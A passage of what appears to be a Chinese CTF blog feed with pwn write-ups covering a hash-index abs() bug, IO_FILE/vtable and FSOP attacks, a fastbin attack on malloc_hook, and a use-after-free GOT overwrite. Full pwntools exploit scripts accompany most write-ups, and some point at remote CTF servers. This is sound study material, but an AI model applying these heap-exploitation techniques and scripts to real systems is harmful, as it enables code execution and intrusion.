= size; v4 = fileno(stdin); v11 = read(v4, value_addr, v3); if ( v11 &lt;= 0 ) ouch(); value_addr = (void *)((size &lt;&lt; 48) | (unsigned __int64)value_addr); name = strdup(&amp;buf); return insert_item((__int64)name, (__int64)value_addr);&#125; 其种insert_item函数是对name作一些运算并进行插入操作。我用的IDA6.8版本的就看不出来用了abs函数（当然即使看出来也不觉得有问题），据说7.0的可以直接显示。 1234567891011121314_DWORD *__fastcall insert_item(__int64 name, __int64 content)&#123; signed int v2; // ST1C_4@1 int v3; // ST18_4@1 int v4; // ST14_4@1 int idx; // ST1C_4@1 v2 = h1((_BYTE *)name); v3 = h2(name); v4 = h3((_BYTE *)name); idx = ((v2 ^ (v2 &gt;&gt; 31)) - (v2 &gt;&gt; 31)) % 62; // abs insert_idx(idx, name, content); return set_hash_bits(idx, v3, v4);&#125; 通过insert_idx函数了解到哈希链表结点的结构。 123456789101112131415161718192021222324_QWORD *__fastcall insert_idx(int idx, __int64 name, __int64 content)&#123; _QWORD *result; // rax@3 __int64 v4; // [sp+8h] [bp-28h]@1 _QWORD *v5; // [sp+28h] [bp-8h]@1 v4 = content; v5 = malloc(0x18uLL); if ( !v5 ) ouch(); v5[1] = name; v5[2] = v4; *v5 = entry[idx]; result = entry; entry[idx] = v5; return result;&#125;struct node&#123; struct node * next; char * name; char * value;&#125;; set_hash_bits函数用位运算记录h2和h3的结果： 12345678_DWORD *__fastcall set_hash_bits(int idx, char a2, char a3)&#123; _DWORD *result; // rax@1 result = bits; bits[idx] |= (1 &lt;&lt; a2) | (1 &lt;&lt; a3); return result;&#125; print和edit都是通过name定位到结点，输出或修改value的值。 find_by_name函数中同样用到了h1，h2，h3函数，并在遍历链表前先对bits[idx]进行检查，查看bits[idx]是否有对应的几个bit。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465signed __int64 __fastcall find(__int64 a1, __int64 a2)&#123; int v2; // eax@1 signed __int64 result; // rax@4 unsigned __int64 *size; // [sp+0h] [bp-120h]@1 __int64 *content_addr; // [sp+8h] [bp-118h]@1 char name; // [sp+10h] [bp-110h]@1 char v7; // [sp+10Fh] [bp-11h]@3 unsigned __int64 v8; // [sp+110h] [bp-10h]@1 __int64 v9; // [sp+118h] [bp-8h]@1 memset(&amp;name, 0, 0x100uLL); v9 = 0LL; v8 = 0LL; printf("Name: ", a2, a2, a1); v2 = fileno(stdin); v9 = read(v2, &amp;name, 0x100uLL); if ( v9 &lt;= 0 ) ouch(); v7 = 0; v8 = find_by_name(&amp;name); if ( v8 ) &#123; *size = v8 &gt;&gt; 0x30; *content_addr = v8 &amp; 0xFFFFFFFFFFFFLL; result = 1LL; &#125; else &#123; result = 0LL; &#125; return result;&#125;__int64 __fastcall find_by_name(char *name)&#123; signed int v1; // ST24_4@1 int v2; // ST20_4@1 char v3; // al@1 __int64 result; // rax@2 int idx; // [sp+24h] [bp-Ch]@1 __int64 i; // [sp+28h] [bp-8h]@3 v1 = h1(name); v2 = h2((__int64)name); v3 = h3(name); idx = ((v1 ^ (v1 &gt;&gt; 31)) - (v1 &gt;&gt; 31)) % 62; //abs if ( (unsigned int)check(idx, v2, v3) ) &#123; for ( i = entry[idx]; i &amp;&amp; strcmp(*(const char **)(i + 8), name); i = *(_QWORD *)i ) ; result = *(_QWORD *)(i + 16); &#125; else &#123; result = 0LL; &#125; return result;&#125;__int64 __fastcall check(int idx, char a2, char a3)&#123; return (((1 &lt;&lt; a2) | (1 &lt;&lt; a3)) &amp; bits[idx]) == ((1 &lt;&lt; a2) | (1 &lt;&lt; a3));&#125; bugs大佬们究竟是怎么想到的？？ abs(0x80000000)==0x80000000。验证一下： 12345678910#include&lt;stdio.h&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int a = 0x80000000; printf("%d\n",a); printf("%#x\n",a^(a&gt;&gt;31)-a&gt;&gt;31); printf("%#x\n",abs(a));&#125; 输出结果： 1234./test-21474836480x800000000x80000000 如果h1(name)为0x80000000，idx = abs(0x80000000)%62=-2，在insert_idx时进行entry[idx] = node_addr时，实际上是对entry之前的数据进行操作。查看bss结构，entry[-2]即为bits[60]。 123456.bss:0000000000202040 ; _DWORD bits[64].bss:0000000000202040 bits dd 40h dup(?) ; DATA XREF: set_hash_bits+Do.bss:0000000000202040 ; set_hash_bits+3Do ....bss:0000000000202140 ; _QWORD entry[62].bss:0000000000202140 entry dq 3Eh dup(?) ; DATA XREF: insert_idx+4Ao.bss:0000000000202140 漏洞利用当输入特定的name时，会在entry[-2]即bits[60]写入堆地址，而在find_by_name中的check会对bits[60]进行检查，确定是否有某一bit，检查失败会返回”No such entry! “，利用这一点可以对bits[60]中的堆地址进行逐位泄露，方法是暴力破解。 另外，在新增结点时，bit[idx]|=1&lt;&lt;a2|1&lt;&lt;a3，通过操作a2和a3能够修改bit[idx]中的内容，即如果能够修改bit[60]中的堆地址，就相当于修改了entry[-2]的首个结点地址，控制这个堆地址中存放满足条件的name，就能泄露或者修改指定的value值。 确定特定的name，使得h1(name)为0x80000000。采用暴力破解的方法。 bit by bit 泄露堆地址，同样也是暴力破解。首先破解特定name满足：h2(name)==h3(name) &amp;&amp; abs(h1(name))%62==60(和61)，这样当a2=a3时，1&lt;&lt;a2|1&lt;&lt;a3就相当于1&lt;&lt;a2，这样就能逐位暴破堆地址了。由于bits数组是DWORD类型的，因此堆地址存放在bits[60]和bits[61]中。Linux系统中规定堆地址为6字节，且最高字节为5x，并且最低1.5字节（12bit）都是从000开始的，因此只需要破解中间的4字节即可。 泄露libc地址。采用的方法是house of orange，修改top的size，得到一个unsorted bin后泄露libc地址。修改top size的方法正如前面所述，先通过位异或修改bit[60]中的堆地址为我们构造好的地址，这个地址作为entry[-2]的首个结点，构造name满足条件，value为top size处的地址，即可通过edit修改top size。这里需要注意的是，修改后的top size需要满足 top end是页对齐的（参考sysmalloc的源码） 修改malloc_hook为one_gadget，方法同上。 利用脚本脚本我是参考EmpireCTF队伍的wp，这里就只附上暴破的简单脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *def h1(s): result = 4919; for c in s: result = result * ord(c)+1 return resultdef h2(s): result = 0 i=0 while i+1&lt;len(s) and s[i] and s[i+1] : tmp = ord(s[i+1])&lt;&lt;8 | ord(s[i]) result ^= tmp i+=2 if i&lt;len(s) and s[i]: result ^= ord(s[i]) return ((result&gt;&gt;10) ^ (result ^ (result &gt;&gt; 5))) &amp;0x1fdef h3(s): result = 0 for c in s: for i in range(8): if (ord(c)&gt;&gt;i)&amp;1: result+=1; result&amp;=0x1f; return result;#破解h1(name)==0x80000000def brute1(): for i in range(255,0,-1): print i for j in range(0,256): for k in range(0,256): for l in range(0,256): tmp = chr(i)+chr(j)+chr(k)+chr(l) if h1(tmp)%0x100000000 == 0x80000000: print tmp print "%d %d %d %d" %(i,j,k,l) return#破解h2(name)==h3(name) &amp;&amp; abs(h1(name))%62==60(和61)#i可以从2字节开始逐步增加到4字节 def brute2(): pos=&#123;&#125; for i in range(0x10000): tmp=p32(i)[:-2] a2=h2(tmp) a3=h3(tmp) if (abs(h1(tmp))%62)==60 and a2==a3: if not pos.has_key(a2): pos[a2]=1 print "%d:%#x" %(a2,u32(tmp.ljust(4,'\x00')))]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE的利用]]></title>
    <url>%2F2018%2F09%2F25%2FIO-FILE%E7%9A%84%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[基础知识参考ctf-wiki中对FILE文件结构的介绍。其中比较重要的是_IO_FILE和_IO_jump_t两个结构体： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;void * funcs[] = &#123; 1 NULL, // "extra word" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf，puts 9 NULL, // xsgetn #scanf 10 NULL, // seekoff 11 NULL, // seekpos 12 NULL, // setbuf 13 NULL, // sync 14 NULL, // doallocate 15 NULL, // read 16 NULL, // write 17 NULL, // seek 18 pwn, // close 19 NULL, // stat 20 NULL, // showmanyc 21 NULL, // imbue&#125;;struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 另外，printf和puts是对stdout进行操作的，执行时会调用vtable中的xsputn；scanf则是对stdin进行操作，调用vatbale的xsgetn。而write和read是直接进行系统调用，不会涉及vtable。 利用方式常见的利用方式有三种： 直接修改_IO_FILE_plus中的vtable指针，使其指向伪造好的函数虚表，例子：2017胖哈勃杯Ox9A82大佬出的pwn500；或者修改整个_IO_FILE_plus，伪造一个完整的FILE结构体，目的同样是操作vtable中的函数，例子：pwnable.tw seethefile。 FSOP：在调用malloc_printerr时会遍历_IO_list_all，并在满足条件时执行 _IO_OVERFLOW。通过修改_IO_OVERFLOW的地址实现利用，例子：2018 SUCTF NOTE。 修改_IO_buf_base实现对内存的写操作，例子：2018 CISCN echo 直接修改vtable/IO_FILE_plus以Ox9A82的pwn500为例，思路是通过修改global_max_fast，使得一个很大的chunk也会放在fastbin中，由于_int_free是利用idx找到fastbin的位置，当idx很大时候，能够覆盖掉stdout的vtable。 _int_free中关于fastbin的代码： 12345678910111213141516171819202122if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())#if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif ) &#123; …… free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); //计算idx: ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) unsigned int idx = fastbin_index(size); //通过idx在arena中找到对应地址 fb = &amp;fastbin (av, idx); …… &#125; 如果计算出stdout的vtable和main_arena中fastbin地址之间的距离，申请这样大小的内存，地址为addr。在free时，fb指向的就是stdout的vtable，由于在free时会对修改fastbin头的FD指针，即fb-&gt;FD = addr，至此，stdout的vtable就指向了堆中的一块内存。这块内存中可以存放构造好的虚函数指针，进而获取shell。 利用脚本如下（可能由于libc的版本问题，本地并没有调通，但通过gdb的调试查看vtable已经覆写成功： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#one_gadget not successfrom pwn import *context.log_level = 'debug'p = process('./pwn500')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def meyer(): p.sendlineafter("Pls input your choice:\n",'1')def ponderosa(): p.sendlineafter("Pls input your choice:\n",'2')def advice(): p.sendlineafter("Pls input your choice:\n",'3')def submit(phone,addr): p.sendlineafter("Pls input your choice:\n",'4') p.sendlineafter("Pls input your phone number first:\n",phone) p.sendlineafter("Ok,Pls input your home address\n",addr)def add(): p.sendlineafter("Pls Input your choice:\n",'2')def remove(): p.sendlineafter("Pls Input your choice:\n",'3')def leave_msg(msg): p.sendlineafter("Pls Input your choice:\n",'4') p.sendlineafter("Get Input:",msg)def advice_msg(size): p.sendlineafter("4.return\n",'1') p.sendlineafter("Input size(200~8000):\n",str(size))def advice_edit(msg): p.sendlineafter("4.return\n",'2') p.sendlineafter("Input your advise\n",msg) def advice_dele(): p.sendlineafter("4.return\n",'3') submit('123456','a'*0x28)p.recvuntil('a'*0x28)atoi_addr = u64(p.recv(6).ljust(8,'\x00'))-16log.info('atoi_addr:%#x',atoi_addr)sys_addr = atoi_addr-(libc.symbols['atoi']-libc.symbols['system'])one_gadget = atoi_addr-(libc.symbols['atoi']-gadget[0])max_fast = atoi_addr-libc.symbols['atoi']+3958776meyer()add()leave_msg('a'*24+p64(max_fast))p.sendlineafter("Pls Input your choice:\n",'5')advice()advice_msg(6064)advice_edit(p64(0xdeadbeef)*5+p64(one_gadget))p.sendlineafter("4.return\n",'4')meyer()remove()leave_msg(p64(0xffffffff))p.sendlineafter("Pls Input your choice:\n",'5')advice()advice_dele()p.interactive() pwnble.tw–seethefile则是通过覆盖掉FP指针，使其指向可控的位置，伪造vtable修改fclose函数地址。 fclose先调用unlink将FILE结构解链，但由于这个FP并不在链中，并没有解下来，但也没继续追究；然后调用_IO_file_close_it将文件关闭，接着调用_IO_FINISH。修改_IO_FINISH为system，并且FP地址前几个字节写入sh，即可获取shell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level='debug'debug = 1if debug: p= process('./seethefile') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('chall.pwnable.tw',10200) libc = ELF('./libc_32.so.6')d = 1def openfile(filename): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('What do you want to see :') p.sendline(filename)def readfile(): p.recvuntil('Your choice :') p.sendline('2')def writefile(): p.recvuntil('Your choice :') p.sendline('3')def closefile(): p.recvuntil('Your choice :') p.sendline('4')def leave(name): p.recvuntil('Your choice :') p.sendline('5') p.sendline(name)#read base addr of libc and seethefileopenfile('/proc/self/maps')readfile()writefile()elf_base = int(p.recv(8),16)readfile()writefile()#p.recvuntil('0 rw-p 00000000 00:00 0 \n')p.recvline()if debug: p.recvline()#for local,delete for romotelibc_base = int(p.recv(8),16)libc.address = libc_basesys_addr = libc.symbols['system']log.info('sys_addr:%#x',sys_addr)print 'elf_base:%x,libc_base: %x' %(elf_base,libc_base)#shellcode = asm('push 0x68732f\n push 0x6e69622f\nmov ebx, esp\nxor ecx,ecx\nxor edx,edx\nmov al,0xb\nint 0x80')fp = elf_base + 0x3284file_struct = 'sh\0\0'+'\x00'*4+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x2e\x6f\xf7\x00\x00\x00\x02\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00'file_struct += '\xc4'+p32(libc_base-0x200)+'\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x80\x24\x6f\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf7'file_struct += p32(fp+0x94)payload = 'a' *32 + p32(fp) +file_struct +p32(0xdeadbeef)*16+ p32(sys_addr)if d: gdb.attach(p,"b *0x8048ae0")leave(payload)p.interactive()#'\xff\x30\xad\xfb' FSOP参考2018suctf-note _IO_buf_ptr以echo为例。本题有一个明显的格式化字符串漏洞（但我并没看出来），能够泄露libc地址、栈地址，也能写内存。向stdin的_IO_buf_ptr中写入\x00，使_IO_buf_base指向_IO_write_base。 这里要介绍一下这几个指针。当fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end时，会向_IO_read_ptr中缓存输入，并执行_IO_read_ptr++；当fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end时，输入的内容就会缓存到_IO_buf_base，且读入的字节数是count = _IO_buf_end-_IO_buf_base，并且_IO_read_end会向后挪动count个字节。 123456789101112131415161718192021222324252627282930313233343536373839404142if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr; if (fp-&gt;_IO_buf_base == NULL) &#123; /* Maybe we already have a push back pointer. */ if (fp-&gt;_IO_save_base != NULL) &#123; free (fp-&gt;_IO_save_base); fp-&gt;_flags &amp;= ~_IO_IN_BACKUP; &#125; _IO_doallocbuf (fp); &#125; …… fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base; // read(0, _IO_buf_base, count) count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base); if (count &lt;= 0) &#123; if (count == 0) fp-&gt;_flags |= _IO_EOF_SEEN; else fp-&gt;_flags |= _IO_ERR_SEEN, count = 0; &#125; // read_end加上这次读所读到的字节数 fp-&gt;_IO_read_end += count; if (count == 0) &#123; /* If a stream is read to EOF, the calling application may switch active handles. As a result, our offset cache would no longer be valid, so unset it. */ fp-&gt;_offset = _IO_pos_BAD; return EOF; &#125; if (fp-&gt;_offset != _IO_pos_BAD) _IO_pos_adjust (fp-&gt;_offset, count); return *(unsigned char *) fp-&gt;_IO_read_ptr;&#125; 当_IO_buf_base指向_IO_write_base时，_IO_read_ptr == _IO_read_end（在scanf和getchar的配合之下，每次都能使_IO_read_ptr == _IO_read_end），在scanf时就会执行read(0, _IO_buf_base, count)，再次对FILE结构中的指针进行覆写，此时可以将_IO_buf_base覆写为栈中返回地址的位置。 为了能够继续覆写返回地址，继续利用scanf，但要先消耗掉_IO_read_ptr。原因在于，刚才的操作count为0x64，_IO_read_end += count，将_IO_read_end向后挪动了0x64个字节，下一个getchar，_IO_read_ptr++，此时_IO_read_ptr和_IO_read_end相差了0x63字节。消耗掉这0x63字节后，才会继续向_IO_buf_base写入。 利用脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level='debug'p = process('./echo')libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def set_name(name): p.sendlineafter("choice&gt;&gt; ","1") p.sendlineafter("name:",name)def echo(l,content): p.sendlineafter("choice&gt;&gt; ","2") p.sendlineafter("length:",str(l)) p.sendline(content)echo(-1,"%3$p")p.recvuntil(" say:")libc_addr = int(p.recv(14),16)-0xf72c0log.info("libc_addr:%#x",libc_addr)echo(-1,"%12$p")p.recvuntil(" say:")ebp_addr = int(p.recv(14),16)-0x30log.info("ebp_addr:%#x",ebp_addr)#gdb.attach(p)set_name(p64(libc_addr+0x3c48e0+0x38))#stdin-&gt;io_buf_ptrecho(-1,"%16$hhn")#write 0 to io_but_ptr's last byte,now io_buf_ptr-&gt;io_write_basepayload= p64(libc_addr+0x3c48e0+0x20+0x63)*3 #three io_write_*payload +=p64(ebp_addr+8)#io_buf_ptrpayload +=p64(ebp_addr+8+12)#io_buf_endpayload +=p64(0)*6payload +=p64(0xffffffffffffffff)payload +=p64(0)echo(payload,'flow')for i in range(0,0x63): echo(1,'1')echo(p64(libc_addr+gadget[0]),'attack')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dc010]]></title>
    <url>%2F2018%2F09%2F10%2Fdc010%2F</url>
    <content type="text"><![CDATA[在现场打比赛紧张得不行ORZ。 基本逻辑 add函数从ptr[0]和ptr[1]中找到一个空闲块，分配一个大小为size的块，用于存放信息。可见本题只有ptr数组中只有两个元素可用。 show函数输出信息。 dele函数很神奇，如果对应的dele_flag为1，代表已经删除过了，直接将指针置零；为1代表还未删除，调用free函数，并把dele_flag置一。这种方法能够防止double free，而且所有指针都只能free一次，之后的就只是把ptr置零。 一些知识 正常情况下，fastbin的inuse位为1，即使在释放时候也不会置零。其他类型的块都会把inuse位置零。 但是当其他类型的块释放并合并时，合并大小大于64KB时，会调用malloc_consolidate合并fastbin中的chunk到unsorted bin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av)) malloc_consolidate(av); …… &#125;static void malloc_consolidate(mstate av)&#123; …… do &#123; check_inuse_chunk(av, p); //nextp为FD指向的块 nextp = p-&gt;fd; /* Slightly streamlined version of consolidation code in free() */ size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); //nextchunk为地址上相邻的下一块 nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //如果前一块空闲，合并 if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //如果下一块不是top，当下一块空闲时，合并；不空闲则把本块的inuse置零 if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else clear_inuse_bit_at_offset(nextchunk, 0); …… //放入unsorted bin first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; …… set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; //下一块为top，与top合并 else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); ……&#125; 另外，在_int_malloc中也有对fastbins的合并：当申请的大小在smallbin范围内，但smallbin中还没有初始化，先对fastbins进行合并，放入unsortedbin（还不知道如何在应用层触发这个条件）；或者是申请的大小在largebin范围内，判断fastbins中是否有chunk，存在则对fastbins合并。 12345678910111213141516171819if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; if (victim == 0) /* initialization check */ malloc_consolidate (av); else …… &#125; &#125;else &#123; idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); &#125; （与本题关系不大）当不能直接触发malloc函数时，可以通过double free触发malloc_printerr进而触发malloc函数，函数调用顺序如下： ​ 另，在unsorted bin非空的情况下，malloc时会沿着unsorted bin寻找合适的块，如果能修改某块的BK指针，使之指向一个不是chunk的地址，同样会触发malloc_printerr，如下面这段代码： 12345678910111213141516int main()&#123; char *a = malloc(0x100); char *b = malloc(0x60); char c[8]; int i; free(a); for(i=0;i&lt;6;i++)&#123; c[i]=a[i]; &#125; c[0]='\x30'; //修改BK指针最后一位为 0x30 strncpy(a+8,c,6); malloc(0x110);&#125; 漏洞分析当第一次调用dele函数时，会使用free，而且不对ptr置零。此时调用show函数则会泄露出FD，即main_arena+88，进而泄露libc地址。 此外，add函数中向ptr[i]中输入info时，没有限制大小，会造成堆溢出。 漏洞利用泄露libc地址ptr[0]要求一个size为0x100的块，即指向大小为0x110的块，ptr[1]要求一个size为0x60的块，即指向大小为0x70的块。第一次dele *ptr[0]，0x110块会放置在unsorted bin 中，FD指针指向main_arena+88，由此泄露libc地址。 覆写malloc_hook释放*ptr[0]之后释放*ptr[1]，由于*ptr[1]是一个fastbin，释放之后不会与top合并。释放两块并置零后，再次申请0x100大小的块，并向其中填充数据，溢出覆盖掉已释放的*ptr[1]中的FD指针，使它指向malloc_hook-35的位置，之所以选择这里是因为如果把这个地址看作一个chunk，size字段恰好为0x7f。达到的效果和fastbin attack一样，再次申请0x60大小的块时就会将malloc_hook-35分配出去，实现向malloc_hook中写入内容。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level='debug'gadget =[0x45216,0x4526a,0xf02a4,0xf1147]debug = 1if debug: p = process('./clear_note') #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('39.107.67.157', 9999)def add(info,size): p.sendlineafter("choice&gt;&gt; ",'1') p.sendlineafter("size: ",str(size)) p.sendlineafter("info: ",info)def show(idx): p.sendlineafter("choice&gt;&gt; ",'2') p.sendlineafter("index: ",str(idx))def dele(idx): p.sendlineafter("choice&gt;&gt; ",'3') p.sendlineafter("index: ",str(idx))add("0gur1",0x100)#0add("0gur2",0x60)#1dele(1)dele(0)show(0)p.recvuntil("info: ")addr = u64(p.recvline()[:-1].ljust(8,'\x00'))log.info('addr:%#x',addr)libc_base = addr - 3951480malloc_hook = libc_base + 3951376log.info('malloc_hook:%#x',malloc_hook)dele(1)dele(0)add('a'*0x100+p64(0xdeadbeef)+p64(0x71)+p64(malloc_hook-35),0x100)dele(0)add("0gur2",0x60)add('a'*19+p64(libc_base+gadget[3]),0x60)#gdb.attach(p)dele(0)p.sendlineafter("choice&gt;&gt; ",'1')p.sendlineafter("size: ",str(0x60))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯线下半决赛pwn]]></title>
    <url>%2F2018%2F09%2F09%2F2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E5%8D%8A%E5%86%B3%E8%B5%9Bpwn%2F</url>
    <content type="text"><![CDATA[pwn1本题的逻辑和线上的EasyCoin还是很像的，但是有些蜜汁逻辑真的看着难受。 基本逻辑 regist函数在ptr数组中找到一个空闲的位置，ptr中每个地址都是一个0x130大小的块，注册后的结构如下： 12345678struct user&#123; char *name; int age; char des[256]; char *msg_list; struct user *next; bool inuse;&#125; login函数简单粗暴的查找username，然后登入。 view_profile打印出用户名、年龄和描述信息。 update更新用户名、年龄和描述信息，非常坑的是，更新用户名时只能再输入strlen(username)长度的字符。 friend函数可以删除或者添加一个friend。删除时，沿着next找到要删除的user。添加时，沿着next找到最后一个结点并添加。忍住不吐槽这个破函数……忍住……. 这里可以添加自己为friend send函数发送msg，每次send之前要构造一个msg结构体,msg的结构体如下： 12345struct msg&#123; char *title; char *content; struct msg *next;&#125; 这里用到的strdup函数相当于： 12p = malloc(strlen(buf));strcpy(p,buf); view_msg和logout比较简单，这里就不列出了。 漏洞分析和EasyCoin一样，本题也可以添加自己为好友，next指针指向自己，删除好友时，相当于释放自己这块内存。而释放后没有将指针置零，UAF漏洞能够泄露地址和覆写got表。 漏洞利用泄露libc地址释放一个user后，它的name字段被覆写为FD，该指针指向main_arena+88。 覆写got表当重新注册一个新用户时，首先在ptr数组中找一个闲置的块，然后按照输入的size，malloc一个块作为name的空间。由于刚刚释放了一个user，unsorted bin中已有一个大小为0x130的块。当输入的size小于0x130时，就会从unsorted bin上分配给name。 此时在name中写入puts@got的地址，即相当覆写已释放的user的name地址为puts@got地址，此时我们再update已释放user，就能向puts@got写入one_gadget地址了。 艰苦的心路历程虽然本题利用很简单，但是！！我踩了好多坑！！ 思路一：把已释放user的name字段覆写为malloc_hook的地址，再update，试图向malloc_hook中写入one_gadget。然而！update时用到了strlen！而strlen(&amp;__malloc_hook)的值为0，也就是根本写不进去 思路二：泄露libc也可以通过environ变量泄露栈地址，覆写函数返回地址为one_gadget。再一次被update阻拦了，栈中的返回地址长度都为3（如0x400ebe）。又想是否能够修改main函数的返回地址？发现main函数是通过exit退出的，没有leave;ret环节。 思路三：向FD所指的main_arena+88中写入got表地址，由于main_arena+88恰好是记录top地址的位置，覆写成got表，之后的malloc会从got表中分配并可以覆写got表。然而，update还必须要输入age，age处对应了BK指针，为了保证能够正常分配块，age也应该保持main_arena+88，但是update对age进行了截断，只复制后四字节然后自行填充，就不能把完整的地址写入BK处。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = 'debug'p = process('./pwn1')gadget=[0x45216,0x4526a,0xf02a4,0xf1147]puts_got = 0x602020def login(name): p.sendlineafter("Your choice:",'1') p.sendlineafter("Please input your user name:",name)def regist(name,size,age,des): p.sendlineafter("Your choice:",'2') p.sendlineafter("Input your name size:",str(size)) p.sendlineafter("Input your name:",name) p.sendlineafter("Input your age:",str(age)) p.sendlineafter("Input your description:",des)def view_info(): p.sendlineafter("Your choice:",'1')def update(name,age,des): p.sendlineafter("Your choice:",'2') p.sendafter("Input your name:",name) p.sendlineafter("Input your age:",str(age)) p.sendlineafter("Input your description:",des)def add_friend(name): p.sendlineafter("Your choice:",'3') p.sendlineafter("Input the friend's name:",name) p.sendlineafter("So..Do u want to add or delete this friend?(a/d)",'a')def dele_friend(name): p.sendlineafter("Your choice:",'3') p.sendlineafter("Input the friend's name:",name) p.sendlineafter("So..Do u want to add or delete this friend?(a/d)",'d')def send(name,title,content): p.sendlineafter("Your choice:",'4') p.sendlineafter("Which user do you want to send a msg to:",name) p.sendlineafter("Input your message title:",title) p.sendlineafter("Input your content:",content)def logout(): p.sendlineafter("Your choice:",'6')regist("0gur11",8,22,"0gur111")regist("0gur22",64,22,"0gur222")login("0gur22")add_friend("0gur22")dele_friend("0gur22")view_info()p.recvuntil("Username:")#leak libcheap = p.recvline()[:-1]heap_len = len(heap)heap_addr = 